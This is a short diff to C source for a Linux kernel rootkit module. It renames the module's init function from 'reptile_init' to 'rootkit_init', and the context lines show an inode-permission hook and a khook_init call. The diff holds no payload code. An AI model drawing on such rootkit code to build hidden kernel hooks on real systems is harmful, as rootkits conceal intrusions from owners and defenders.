@@ -54,7 +54,7 @@ static int khook_inode_permission(struct inode* inode, int mask) {
 /**
  * Rootkit module initialization.
  */
-static int __init reptile_init(void) {
+static int __init rootkit_init(void) {
 	printk(KERN_INFO "Initializing rootkit.\n");
 	khook_init();
 	return 0;
